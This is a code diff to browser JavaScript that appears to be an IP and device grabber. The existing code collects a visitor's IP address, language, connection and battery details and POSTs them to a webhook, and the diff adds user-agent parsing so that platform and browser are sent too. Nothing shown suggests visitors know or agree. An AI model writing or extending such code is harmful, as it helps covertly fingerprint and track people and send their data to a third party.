@@ -36,13 +36,29 @@
                     isCharging = battery.charging ? "Charging" : "Not Charging";
                 }
 
+                const userAgent = navigator.userAgent;
+                let platform = "Unknown";
+                if (/Android/i.test(userAgent)) platform = "Android";
+                else if (/iPhone|iPad|iPod/i.test(userAgent)) platform = "iOS";
+                else if (/Windows/i.test(userAgent)) platform = "Windows";
+                else if (/Mac/i.test(userAgent)) platform = "MacOS";
+                else if (/Linux/i.test(userAgent)) platform = "Linux";
+
+                let browser = "Unknown";
+                if (/Chrome/i.test(userAgent) && !/Edg/i.test(userAgent)) browser = "Chrome";
+                else if (/Firefox/i.test(userAgent)) browser = "Firefox";
+                else if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) browser = "Safari";
+                else if (/Edg/i.test(userAgent)) browser = "Edge";
+                else if (/Opera|OPR/i.test(userAgent)) browser = "Opera";
+                else if (/UCBrowser/i.test(userAgent)) browser = "UC Browser";
+
                 await fetch(webhookUrl, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        content: `IP Address: ${ip}\nBrowser Language: ${language}\nConnection Type: ${connectionType}\nNetwork Type: ${networkType}\nBattery Level: ${batteryLevel}\nCharging Status: ${isCharging}`
+                        content: `IP Address: ${ip}\nBrowser Language: ${language}\nConnection Type: ${connectionType}\nNetwork Type: ${networkType}\nBattery Level: ${batteryLevel}\nCharging Status: ${isCharging}\nPlatform: ${platform}\nBrowser: ${browser}`
                     })
                 });
 
